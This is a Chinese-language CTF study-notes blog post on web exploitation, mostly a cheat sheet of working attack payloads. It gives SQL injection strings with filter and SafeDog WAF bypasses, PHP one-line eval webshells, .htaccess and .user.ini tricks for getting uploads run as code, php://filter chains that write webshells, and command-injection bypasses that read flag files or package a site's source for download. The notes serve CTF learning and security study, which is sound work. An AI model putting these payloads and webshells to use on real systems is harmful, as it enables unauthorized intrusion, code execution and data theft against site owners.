title: CTF学习笔记
tags:
  - 学习笔记
categories: []
author: bmth
img: 'https://img-blog.csdnimg.cn/20210304213923323.png'
date: 2020-10-27 17:53:00
---
## web
[狼组安全团队公开知识库](https://wiki.wgpsec.org)
[红方人员实战手册](https://github.com/klionsec/RedTeamer)
[Web安全攻防实战系列](https://github.com/hongriSec/Web-Security-Attack)
[Web安全学习笔记](https://websec.readthedocs.io/zh/latest/index.html)
[https://www.vulnhub.com](https://www.vulnhub.com)
[Vulhub - Docker-Compose file for vulnerability environment](https://vulhub.org)
[https://github.com/w181496/Web-CTF-Cheatsheet](https://github.com/w181496/Web-CTF-Cheatsheet)
### sql绕过技巧
[SQL注入WIKI](http://sqlwiki.radare.cn)
[sqli_lab总结](https://www.dazhuanlan.com/2020/03/01/5e5ad85325ae9/)
sql语句的另一种
`unio<>n sele<>ct 1,table_name,3 fro<>m information_schema.tables where table_schema=database()`
reverse 函数：主要功能是把一个字符产反转

常规的sql盲注payload大致为：
```sql
id=1^if(ascii(substr(database(),1,1))=102,2,3)
当ascii(substr(database(),1,1))=102为真时，则id=1^2=3 否则就是id=1^3=2
当 ' , 空格 等号 like ascii被过滤
过滤了空格可以用括号代替，或者/**/；过滤了单引号可以用16进制代替；过滤了逗号，对于substr可以用 substr(database() from 1 for 1)代替substr(database(),1,1)，if中有逗号可以用case when代替if；过滤了 ascii可以用ord代替；过滤了等号和like可以用regexp代替。
这样上面的常规语句就可以转化为
id=1^case(ord(substr(database()from(1)for(1))))when(102)then(2)else(3)end
```
**堆叠注入：**
`1';sEt @t=(<sqli>);prepare x from @t;execute x;#`
其中sqli语句可用16进制0x代替
```sql
set @t=(<sqli>);prepare x from @t;execute x;#

handler <tablename> open as <handlername>; #指定数据表进行载入并将返回句柄重命名
handler <handlername> read first; #读取指定表/句柄的首行数据
handler <handlername> read next; #读取指定表/句柄的下一行数据
.....
handler <handlername> close; #关闭句柄
```

**时间盲注：**
```sql
"0^((ascii(substr(({0}),{1},1)))>{2})^0#".format(sql,i,mid)
"if((ascii(substr(({0}),{1},1)))>{2},1, 0)".format(sql,i,mid)
"if((ascii(substr(({0}),{1},1)))>{2},sleep(3),0)".format(sql,i,mid)
"and case when (ascii(substr({0},{1},1))>{2}) then (benchmark(1000000，sha(1))) else 2 end".format(sql,i,mid)
```
[MySQL时间盲注五种延时方法 (PWNHUB 非预期解)](https://www.cdxy.me/?p=789)
[mysql 延时注入新思路](https://xz.aliyun.com/t/2288)
[基于时间盲注的部分相关函数](https://www.dazhuanlan.com/2020/03/01/5e5a91d69b124/)

**2019ACTF相关知识点**
>过滤了if，elt，case ，用 and 1 and sleep(3) #
过滤了sleep，可以用heavy-query
过滤flag列名，但使用表别名失败，但知道表名，可以用select * from Look_here limit 1 来获取
如果= 被过滤可以用regexp binary 或者 like binary（没有过滤 =）
过滤了sub ， 用mid

[heavy-query注入](https://www.jianshu.com/p/b6ad41ff69d0)
[【技术分享】一种新的MySQL下Update、Insert注入方法](https://www.anquanke.com/post/id/85487)
[ACTF 2019 初赛 解题报告](https://www.csuaurora.org/ACTF_2019/)

= 可用正则绕过（regexp）
= 可用like绕过，like模糊查询可以使用%匹配多个字符，_匹配单个字符。
<>为不等于，!(table_name<>'')可绕过=
select case when 条件触发代替if语句
or 可用 || 
and 可用 &&
空格可用/**/
数据库，表名，列名，字段名可用0x (16进制)转换
#可以用\x00替代

()可以绕过空格的过滤：
观察到user()可以算值，那么user()两边要加括号，变成`select(user())from dual where 1=1 and 2=2;`
继续，1=1和2=2可以算值，也加括号，去空格，变成`select(user())from dual where(1=1)and(2=2)`
空格：
`%09` `%0a` `%0b` `%0c` `%0d` `%16` `/**/` `/*!*/`或者直接tab，`%a0`在特定字符集才能利用
%0a：换行符

登录：`username=admin&password='-0-'`

过滤了聚合函数：concat，可以使用make_set
```sql
(select updatexml(1,make_set(3,'~',(select flag from flag)),1))
```
`ord(substr((select smth),x,1))=77`，如果过滤了`"or"`关键词，ord被禁止了。
不过还是可以通过`conv(hex(substr((select ...),x,1)),16,10)=77`绕过
#### 绕过安全狗
sel%ect
针对asp+access：
1. 可以代替空格的字符：%09，%0A，%0C，%0D
2. 截断后面语句的注释符：%00，%16，%22，%27
3. 当%09，%0A，%0C，%0D超过一定的长度，安全狗就失效了

[Fuzz安全狗注入绕过](https://www.cnblogs.com/perl6/p/7076524.html)
[一次实战sql注入绕狗](https://xz.aliyun.com/t/7515)

如果**过滤了information_schema**可以用
```sql
sys.schema_auto_increment_columns
?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+

sys.schema_table_statistics_with_buffer
?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+

mysql.innodb_table_stats
?id=-1' union select 1,(select group_concat(table_name) from mysql.innodb_table_stats),3--+

sys.x$schema_table_statistics_with_buffer
?id=-1' union select 1,2,group_concat(table_name)from sys.x$schema_table_statistics_with_buffer where table_schema=database()--+

sys.x$schema_flattened_keys
?id=-1' union select 1,2,group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()--+

sys.x$ps_schema_table_statistics_io
?id=-1' union select 1,2,group_concat(table_name)from sys.x$ps_schema_table_statistics_io where table_schema=database()--+

sys.schema_table_statistics
```
[聊一聊bypass information_schema](https://www.anquanke.com/post/id/193512)
#### 偏移注入
我们利用“*”代替admin表内存在的字段，由于是18个字段数，需要逐步测试，直到返回正常。
```sql
?id=1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,* from sys_admin  #错误
?id=1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from sys_admin     #错误
?id=1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,* from sys_admin        #错误
直到.........
?id=1 union select 1,2,3,4,5,6,7,8,9,10,11,* from sys_admin #正确
```
说明了sys_admin表下有11个字段
**偏移注入的基本公式为:**
`order by 出的字段数减去*号的字段数，然而再用order by的字段数减去2倍刚才得出来的答案`
也就是18-11=7
18-7*2=4
得到答案等于：4

然后依旧是套公式的过程。

```sql
?id=1 union select 1,2,3,4,a.id,b.id,* from (sys_admin as a inner join sys_admin as b on a.id = b.id)
#这里union select 1,2,3,4：顾名思义就是刚才得出来的长度。
#后面的是sql，可作公式。
```
[移位溢注：告别依靠人品的偏移注入](https://gh0st.cn/archives/2017-03-08/1)
#### select * from ‘admin’ where password=md5($pass,true)
`ffifdyop` 这个字符串被 md5 哈希了之后会变成 `276f722736c95d99e921722cf9ed621c`，Mysql 刚好又会把 hex 转成 ascii这个字符串，前几位刚好是` ' or '6`，构造成万能密码
```
content: 129581926211651571912466741651878684928
hex: 06da5430449f8f6f23dfc1276f722738
raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1'or'8
string: T0Do#'or'8
content: ffifdyop
hex: 276f722736c95d99e921722cf9ed621c
raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
string: 'or'6]!r,b
```
`SELECT * FROM admin WHERE username = 'admin' and password = ''or'6xc9]x99'`

由于**and**运算符优先级比**or**高，所以前面的：`username = 'admin' and password = ''`会先执行，然后将执行结果与后面的`'6xc9]x99'`进行or运算。在布尔运算中，除了`0、'0'、false、null，`其余结果都为真。所以整个SQL语句的where条件判断部分为真

![](https://img-blog.csdnimg.cn/20201003144438903.png#pic_center)

#### 利用join进行无列名注入
```sql
select 1,2,3 union select * from sc;
select `1` from (select 1,2,3 union select * from sc)a;
select `2` from (select 1,2,3 union select * from sc)a;
当 ` 不能使用的时候，使用别名来代替：
select b from (select 1,2 as b,3 union select * from sc)a;

select * from sc union all select * from (select * from information_schema.tables as a join information_schema.tables b)c;
得到第一列列名 table_catalog
select * from sc union all select * from (select * from information_schema.tables as a join information_schema.tables b using(table_catalog))c;
得到第二列列名 table_schema
select * from sc union all select * from (select * from information_schema.tables as a join information_schema.tables b using(table_catalog,table_schema))c;
依次类推
```
#### sql例题分析(难)
先是 and or & |被过滤，导致逻辑表达会有些麻烦，但是我们依然有异或运算符\^，由于 id 字段是字符串，在 mysql 中与 0 等价，由于 0\^1=1，0^0=0，故语句的真假就是查询结果的真假

由于 flag 被过滤，无法用 select flag from user 来查 flag，所以要用别名代替，但是别名代替有 select 1,2,3,4 有逗号，所以用 join 再代替`(空格换成 / a / 即可)`：
```sql
union select * from (select 1)a join (select 2)b join (select 3)c%23
等同于：
union select 1,2,3
同样
limit 1 offset 2
等同于：
limit 2,1
以及
substr(database() from 5 for 1)
等同于：
substr(database(),5,1)

payload:
1 ^ (ascii(mid((select `4` from (select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union select * from user)e limit 1 offset 1) from 1 for 1))>0) ^ (1=1)%23
```
发现 from 1 for 1 那里，or 被过滤，for 也不能用了，所以可以用 regexp 或者 like 来单字符盲注
```sql
select user from users where id='1' ^ ((select `4` from (select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union select * from user)e limit 1 offset 1) like "a%")^(1=1)
```
然而这还不是时间盲注，我们可以考虑用下面笛卡尔积这种大量运算的方法去延时：
`select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C`

由于 or 被过滤，所以 information_schema 无法使用，可用 mysql 数据库中的 help_topic（这是一张更大的表）来代替：
```sql
1 ^ (select case when ((select `4` from (select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union select * from user)e limit 1 offset 1) like "a%") then (select count(*) from mysql.help_topic A,mysql.help_topic B,mysql.help_topic C) else 0 end)%23
```
意外地发现%也被过滤掉了（出题人挖坑自己都不知道系列），所以用 regexp 来绕过。
```sql
1 ^ (select case when ((select `4` from (select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union select * from user)e limit 1 offset 1) regexp "^f.{0,}") then (select count(*) from mysql.help_topic A,mysql.help_topic B,mysql.help_topic C) else 0 end)^'1'='1
```
然后你会发现，笛卡尔积的方式也有逗号

于是我们发现了新的笛卡尔积方法：

`SELECT count(*) FROM mysql.help_relation CROSS JOIN mysql.help_topic cross join mysql.proc;`

这种笛卡尔积是不允许同一个表 cross join 自己的，但是起个别名就可以了

`SELECT count(*) FROM mysql.help_relation CROSS JOIN mysql.help_topic A cross join mysql.proc B;`

所以最终的 payload：

(本题的 mysql 服务似乎和本地的不太一样，mysql_help*表不管有多少都能秒出结果，无法造成延时，所以再连接一个其他的表比如 innodb_table_stats 就可以造成超长延时。。下面这个 payload 是测试过的延时时间比较合理的，3 秒左右)
```sql
1'^/*a*/(select/*a*/case/*a*/when/*a*/((select/*a*/`4`/*a*/from/*a*/(select/*a*/*/*a*/from/*a*/(select/*a*/1)a/*a*/join/*a*/(select/*a*/2)b/*a*/join/*a*/(select/*a*/3)c/*a*/join/*a*/(select/*a*/4)d/*a*/union/*a*/select/*a*/*/*a*/from/*a*/user)e/*a*/limit/*a*/1/*a*/offset/*a*/1)/*a*/regexp/*a*/binary/*a*/"^f.*")/*a*/then/*a*/(SELECT/*a*/count(*)/*a*/FROM/*a*/mysql.help_relation/*a*/A/*a*/CROSS/*a*/JOIN/*a*/mysql.help_topic/*a*/B/*a*/cross/*a*/join/*a*/mysql.innodb_table_stats/*a*/D/*a*/cross/*a*/join/*a*/mysql.user/*a*/E/*a*/cross/*a*/join/*a*/mysql.user/*a*/F)/*a*/else/*a*/0/*a*/end)^'1'='1
```
写脚本的一些注意事项：

>由于过滤了 flag，所以脚本不能出现 flag，即从头开始^f. 到^fla. 一直到^flag. 时，flag * 会被过滤，所以要避开，用.来代替：^fla.{.*
然后在匹配数字的时候，要加反斜杠\，或者用括号括起来，因为 SQL 正则本身数字属于特殊字符
然后正则默认是不区分大小写的，所以你直接 regexp 得到的结果是不正确的，要加上 binary 字段：regexp binary xxx 才区分大小写

来源：[第三届CBCTF官方WP ](https://www.anquanke.com/post/id/212808)

可学习的文章：
[在SQL注入中利用MySQL隐形的类型转换绕过WAF检测](https://www.freebuf.com/articles/web/8773.html)
[SQL注入有趣姿势总结](https://xz.aliyun.com/t/5505)
[SQL注入：限制条件下获取表名、无列名注入](https://www.cnblogs.com/20175211lyz/p/12358725.html)
[MYSQL8.0注入新特性](https://xz.aliyun.com/t/8646)
[一次insert注入引发的思考](https://xz.aliyun.com/t/5099)
[Pgsql堆叠注入场景下通过CREATE FUNCTION来实现命令执行](https://www.anquanke.com/post/id/215954)
[REGEXP注入与LIKE注入学习笔记](https://xz.aliyun.com/t/8003)
[XPATH注入学习](https://xz.aliyun.com/t/7791)
[PostgreSQL Injection](https://evi1cg.me/archives/PostgreSQL-Injection.html)
[XPATH注入](https://www.cnblogs.com/wangtanzhi/p/13018953.html)
[Smi1e：Sql注入笔记](https://www.smi1e.top/2018/06/19/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/)
[一篇文章带你深入理解 SQL 盲注](https://www.anquanke.com/post/id/170626)
[玩得一手好注入之order by排序篇](https://blog.csdn.net/nzjdsds/article/details/82461922)
[当concat()在报错注入不可用时](https://www.dazhuanlan.com/2019/11/30/5de149bd419ec/)
[对MYSQL注入相关内容及部分Trick的归类小结](https://xz.aliyun.com/t/7169)
[无需“in”的SQL盲注](https://nosec.org/home/detail/3830.html)
[Alternatives to Extract Tables and Columns from MySQL and MariaDB](https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb/)
[王叹之：sql注入中的其他姿势](https://www.cnblogs.com/wangtanzhi/p/12594949.html)

### 文件上传，文件包含绕过
[file_put_content和死亡·杂糅代码之缘](https://xz.aliyun.com/t/8163)
比如a.php文件
```php
<?php @eval($_POST['pass']);?>
```
可替换为(**PHP7版本已经不支持了**)
```php
GIF89
<script language="php">@eval($_POST['pass']);</script>
```
[一句话木马的套路](https://www.freebuf.com/articles/web/195304.html)
[各种一句话木马大全](https://blog.csdn.net/l1028386804/article/details/84206143)
[PHP Webshell那些事——攻击篇](https://www.anquanke.com/post/id/212728)
[探讨新技术背景下的一句话免杀](https://www.anquanke.com/post/id/197624)

**短标签:**
PHP开启短标签即short_open_tag=on时，可以使用<?=$_?>输出变量
filename=`"<?=@eval($_POST['a']);?>"`

**CVE-2018-12613Phpmyadmin**
如果将 ？双重编码，经过包含时会把你包含的文件当作一个目录，也就是说，如果你写入：
`hint.php%25%3F(%25%3F是?的二次编码)`
那么解析时会把hint.php当作一个目录来看。

**序列化木马：**
```php
<?php
class A{
    var $a = "<?php phpinfo()?>";
}
$aa = new A();
echo serialize($aa);
?>
```

__扩展名绕过：__
Asp:asa cer cdx
Aspx:ashx asmx ascx
Php:php php3 php4 php5 php7 pht phtml phps
Jsp:jspx jspf

#### .htaccess知识
```php
<FilesMatch "xxx">
SetHandler application/x-httpd-php
</FilesMatch>
```
匹配到文件名中含有xxx的字符 就以php形式去解析。
或者：
```php
AddType application/x-httpd-php .jpg
SetHandler application/x-httpd-php
```
使jpg文件都解析为php文件。
当前目录及其子目录下所有文件都会被当做 php 解析
```php
Options ExecCGI #允许CGI执行
AddHandler cgi-script .xxx #将xx后缀名的文件，当做CGI程序进行解析
```
>.htaccess上传的时候不能用GIF89a等文件头去绕过exif_imagetype,因为这样虽然能上传成功，但.htaccess文件无法生效。这时有两个办法:
一：
#define width 1337
#define height 1337
二：
在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)
x00x00x8ax39x8ax39 是wbmp文件的文件头
.htaccess中以0x00开头的同样也是注释符，所以不会影响.htaccess

由于php是7.2的版本，无法使用`<script language="php"></script>`
**可以通过编码进行绕过，如原来使用utf8编码，如果shell中是用utf16编码则可以Bypass**
我们这里的解决方法是将一句话进行base64编码，然后在.htaccess中利用php伪协议进行解码,比如:
**.htaccess:**
```javascript
#define width 1337
#define height 1337
AddType application/x-httpd-php .abc
php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.abc"
```
**shell.abc：**
```javascript
GIF89a12PD9waHAgZXZhbCgkX0dFVFsnYyddKTs/Pg==
```
这里GIF89a后面那个12是为了补足8个字节，满足base64编码的规则

[Apache的.htaccess利用技巧](https://xz.aliyun.com/t/8267)
[.htaccess利用与Bypass方式总结 ](https://www.anquanke.com/post/id/205098)
[Apache中.htaccess文件利用的总结与新思路拓展](https://www.freebuf.com/vuls/218495.html)
#### .user.ini
可以借助`.user.ini`轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。在.user.ini写入代码如下，上传：
```php
GIF89a
auto_prepend_file=a.jpg
```
#### windows文件上传特性
上传文件名   | 服务器表面现象|生成文件内容
-------- | --------|-----
test.php:1.jpg| 生成test.php|空
test.php::$DATA| 生成test.php|`<?php phpinfo();?>`
test.php::$INDEX_ALLOCATION|生成test.php文件夹|
test.php::$DATA.jpg|生成0.jpg|`<?php phpinfo();?>`
test.php::$DATA\aaa.jpg|生成aaa.jpg|`<?php phpinfo();?> `

利用步骤：
1. 先上传shell.php:.jpg，得到空的shell.php
2. 再上传shell.<<<，会覆盖原来的shell.php
3. 即可得到webshell

[php一句话绕过技术分析](https://xz.aliyun.com/t/3924#toc-9)
[PHP LFI 利用临时文件 Getshell 姿势 ](https://www.anquanke.com/post/id/201136)

require和取反运算符之间不需要空格照样执行，即`<?=require~%d0%99%93%9e%98?>`

#### PHP伪协议
php遇到不认识的协议就会当目录处理
`url=a://ctfshow.com/../../../../../../../fl0g.txt`
**php://filter**
`?filename=php://filter/convert.base64-encode/resource=xxx.php`
`?filename=php://filter/read=convert.base64-encode/resource=xxx.php` 一样。
条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；

```
php://filter/convert.%6%32ase64-encode/resource=flag.php
php://filter/resource=flag.php
compress.zlib://flag.php
php://filter/read=string.rot13/resource=flag.php
php://filter/convert.iconv.utf-8.utf-7/resource=flag.php
php://filter/read=convert.quoted-printable-encode/resource=flag.php
php://filter/zlib.deflate/resource=flag.php (本地再 zlib.inflate 解压就可以读到了)
php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
```
file_put_contents中可以调用伪协议，而伪协议处理时会对过滤器urldecode一次，所以是可以利用二次编码绕过的

>a: %6%31
b: %6%32
i: %6%39
q: %7%31
r: %7%32
u: %7%35
U: %5%35

写文件绕过死亡函数exit
```
php://filter/write=string.%7%32ot13|<?cuc riny($_CBFG[ozgu]);?>|/resource=bmth.php
php://filter/convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?<hp pe@av(l_$OPTSb[tm]h;)>?/resource=bmth.php
php://filter/convert.%6%39conv.%5%35CS-4LE.%5%35CS-4BE|aahp?<e@ p(lavOP_$b[TS]htm>?;)/resource=bmth.php
php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydibXRoJ10pOz8+|convert.%6%39conv.%5%35tf-8.%5%35tf-7|convert.%6%32ase64-decode/resource=bmth.php
php://filter/write=convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|string.%7%32ot13|a?%3Cuc%20cr@ni(y_$BCGFo[gz]u;)%3E?/resource=bmth.php
php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0Deval($_GET[1]);?>/resource=bmth.php
```

[探索php://filter在实战当中的奇技淫巧](https://www.anquanke.com/post/id/202510)
[可用过滤器列表](https://www.php.net/manual/zh/filters.php)

**php://input**
碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据
`?file=php://input`
POST：`<?PHP fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>');?>`
条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP < 5.3.0）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行。

**data://text/plain**
`?file=data:text/plain,<?php phpinfo()?>`
`?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=`

**phar://伪协议**
用法：`?file=phar://压缩包/内部文件 phar://xxx.png/shell.php `
注意： PHP > =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 
可以利用压缩过滤器触发phar：compress.zlib://phar:///var/www/html/upload/xxxx.gif

[初探phar://](https://xz.aliyun.com/t/2715)
[Phar的一些利用姿势](https://xz.aliyun.com/t/3692)
[利用 phar 拓展 php 反序列化漏洞攻击面](https://paper.seebug.org/680/)

**zip://伪协议**
用法：`?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php`
条件： PHP > =5.3.0，注意在windows下测试要5.3.0<PHP<5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。

**当compress.zlib加在任何其他协议之前，仍然会保持其他协议的功能**
>1. data协议的格式
data协议的格式为`data: [ mediatype ] [ ";charset" ] [ ";base64" ] , data`。其中charset，base64可选;data可用url编码。然而一个在php中，一个合法的data协议只需要满足`data:xxx/xxx;test=test;%23`就行。
>2. data协议的base64编码
由于filter_var很敏感，遇到一些空格报错，所以可以利用data协议的base64绕过。
`compress.zlib://data:@127.0.0.1/?;base64,(base64编码后的payload)`

[php 伪协议](https://www.cnblogs.com/2019gdiceboy/p/11777299.html)
[php伪协议实现命令执行的七种姿势](https://www.freebuf.com/column/148886.html)
[PHP伪协议总结](https://segmentfault.com/a/1190000018991087)

大佬文章：
[Web安全实战系列：文件包含漏洞](https://www.freebuf.com/articles/web/182280.html)
[bypass-RFI限制的一些思路](https://www.redteaming.top/2019/05/15/bypass-RFI%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/)

### 命令执行
`$_SERVER['QUERY_STRING']`不会进行URLDecode，而`$_GET[]`会，所以只要进行url编码即可绕过

换行符     %0a
连续指令   ；
后台进程 &
管道符 |

命令分隔符：
linux中：`%0a 、%0d 、; 、& 、| 、&&、||`
windows中：`%0a、& 、| 、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）`

>在bash中，$( )与\``(反引号)都是用来作命令替换的。
各自的优缺点：
>1.`` 基本上可用在全部的 unix shell 中使用，若写成 shell脚本，其移植性比较高，但反引号容易打错或看错。
>2.\$()更有可读性，但是$()并不是所有shell都支持。

**空格代替：
<>符号
< 符号
$IFS
${IFS}
$IFS$9
%09，%0b，%oc，%20用于url传递**
whidows下，可以用`%ProgramFiles:~10,1%`，%ProgramFiles%一般为 C:\Program Files


`a=l;b=s;$a$b等于ls`
base64编码：   `echo d2hvYW1p|base64 -d`   d2hvYW1p的base64编码为whoami
![](https://img-blog.csdnimg.cn/20200829152321418.png#pic_center)

16进制： `echo "0x636174202e2f666c6167" |xxd -r -p`
![](https://img-blog.csdnimg.cn/20200829152023261.png#pic_center)
`$(printf "\x63\x61\x74\x20\x2e\x2f\x66\x6c\x61\x67")`
![](https://img-blog.csdnimg.cn/20200829152241308.png#pic_center)
8进制：`$(printf "\167\150\157\141\155\151")`
![](https://img-blog.csdnimg.cn/20200829152434478.png#pic_center)

**"substr string pos len"用法示例：**
该表达式是从string中取出从pos位置开始长度为len的子字符串。如果pos或len为非正整数是，将返回空字符串。
**下列例子是输出反斜杠/：**
>echo \${PATH:0:1}
echo \`expr$IFS\substr\\$IFS\\$(pwd)\\$IFS\1\\$IFS\1\`
echo \$(expr\${IFS}substr\${IFS}\$PWD\${IFS}1${IFS}1)\
expr\${IFS}substr\${IFS}\$SESSION_MANAGER\${IFS}6${IFS}1

读源码：
ping;cp 12345.php 2.txt  再访问2.txt

写入文件：
`;echo <?php phpinfo();?> >1.php`

```php
1：$a=ag.php;$b=fl;cat$IFS$9$b$a
2：cat$IFS$9`ls`
3：echo$IFS$9Y2F0IGZsYWcucGhw=$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|sh
4：tar$IFS$9-cvf$IFS$9index$IFS$9. 打包目录下的所有文件为index，下载即可
```

```php
$_=`/???/??? /????`;?><?=$_?>
实际上等价于：
$_=`/bin/cat /FLAG`;?><?=$_?>

<?=$_?> 实际上这串代码等价于<? echo $_?>。实际上，当 php.ini 中的 short_open_tag 开启的时候，<? ?> 短标签就相当于 <?php ?>，<?=$_?> 也等价于 <? echo $_?>
```
[CTF题目思考--极限利用](https://www.anquanke.com/post/id/154284)
[命令执行与代码执行的小结 ](https://www.anquanke.com/post/id/162128)

花括号的别样用法：
![](https://img-blog.csdnimg.cn/20200313130312550.png)
```
$( )中放的是命令，相当于` `，例如todaydate=$(date +%Y%m%d)意思是执行date命令，返回执行结果给变量todaydate，也可以写为todaydate=`date +%Y%m%d`；
${ }中放的是变量，例如echo ${PATH}取PATH变量的值并打印，也可以不加括号比如$PATH。
```
```bash
cat可用 more${IFS}`ls`代替，还可以用ca\t fl\ag,ca""t flag,ca''t flag,sort flag,od -c flag
使用通配符：/???/??t fl??
查看文件头几行： head 文件名
查看文件后几行： tail 文件名
反向查看： tac 文件名
base64 文件名
`cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev`
```

**一个考点，记录一下：(php反引号命令执行)**
```php
<?php
    if(isset($_GET['cc'])){
        $cc = $_GET['cc'];
        eval(substr($cc, 0, 6));
    }
    else{
        highlight_file(__FILE__);
    }
?>
```
`eval(substr($cc, 0, 6));`他只执行`$cc`的前6个字符，但是可以利用
```
`$cc`;xxxxxxxxxx
```
xxxxx为执行的命令
[新春战"疫"，高校ctf](https://www.mrkaixin.top/posts/df9f633e/)

参考文章：
[DNSlog盲注](http://www.pdsdt.lovepdsdt.com/index.php/2020/11/04/dnslog/)
[RCE Bypass小结](http://www.pdsdt.lovepdsdt.com/index.php/2020/12/08/rce-bypass/)
[命令执行绕过总结](https://mp.weixin.qq.com/s/6E2fXnuHkBt_fgRZL6z7bA)
[巧用命令注入的N种方式](https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/)
[浅谈PHP无回显命令执行的利用](https://xz.aliyun.com/t/8125)
[CTF命令执行及绕过技巧](https://blog.csdn.net/JBlock/article/details/88311388)
[Bypass一些命令注入限制的姿势](https://xz.aliyun.com/t/3918)
[ 巧用DNSlog实现无回显注入](https://www.cnblogs.com/afanti/p/8047530.html)
[ctf中常见php rce绕过总结](https://xz.aliyun.com/t/8354)
#### [CISCN 2019 初赛]Love Math 学习
一种payload是这样：
```php
$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=tac flag.php
```
分析：
```
base_convert(37907361743,10,36) => "hex2bin"
dechex(1598506324) => "5f474554"
$pi=hex2bin("5f474554") => $pi="_GET"   //hex2bin将一串16进制数转换为二进制字符串
($$pi){pi}(($$pi){abs}) => ($_GET){pi}($_GET){abs}  //{}可以代替[]
```
另一种payload是这样
```php
$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})
```
分析：
```
base_convert(696468,10,36) => "exec"
$pi(8768397090111664438,10,30) => "getallheaders"
exec(getallheaders(){1})
//操作xx和yy，中间用逗号隔开，echo都能输出
echo xx,yy
既然不能$_GET，那就header传
```
![](https://img-blog.csdnimg.cn/20200320141415534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
直接想办法catflag也是可以的
```php
//exec('hex2bin(dechex(109270211257898))') => exec('cat f*')
($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))
//system('cat'.dechex(16)^asinh^pi) => system('cat *')
base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))
```
[刷题记录：[CISCN 2019 初赛]Love Math](https://www.cnblogs.com/20175211lyz/p/11588219.html)

#### 命令执行绕过
**不用数字构造出数字**
利用了 PHP 弱类型特性，true 的值为 1，故 true+true==2。
```php
<?php
$_=('>'>'<')+('>'>'<');
print($_);
print($_/$_);
```
结果会输出：2 1

在 php 中未定义的变量默认值为 null，`null==false==0`，所以我们能够在不使用任何数字的情况下通过对未定义变量的自增操作来得到一个数字。
```php
<?php
$_++;
print($_);
```
结果会输出：1
```php
<?php
print(!!_);
```
![](https://img-blog.csdnimg.cn/20200915000040693.png)
**对(''.[])[sin(0)]的思考：**
`(''.[])[sin(0)]`，找到了A，`('b')[sin(0)]`可以得到b
>拆成两个部分：''.[]和[sin(0)]
前半部分是通过强转换的方式将''和[]进行拼接，[]会变成Array，而前面是空字符，所以拼接完之后的字符串是Array
后半部分sin(0)取值是0，所以是[0]
两个拼接起来后就是取了A，有一种C语言字符串取值的感觉了，最后优化一下，可以改成：'A'[sin(0)]
"ab"[[0]]输出的是b
如果[]中是数组且有值的，那就会转成"abc"[1]；而如果[]中是数组但没有值的，那就会转成"abc"[0]

![](https://img-blog.csdnimg.cn/20201013190132266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)

[ISITDTU CTF 2020 部分Web题目Writeup](https://www.cnblogs.com/erR0Ratao/p/13801674.html)
[php利用math函数rce总结](https://www.anquanke.com/post/id/220813)
**PHP 中取反 (~) 的概念**
```php
<?php 
error_reporting(0);
$a='assert';
$b=urlencode(~$a);
echo $b;
echo "\n";
$c='(eval($_POST[pass]))';
$d=urlencode(~$c);
echo $d;
 ?>
```
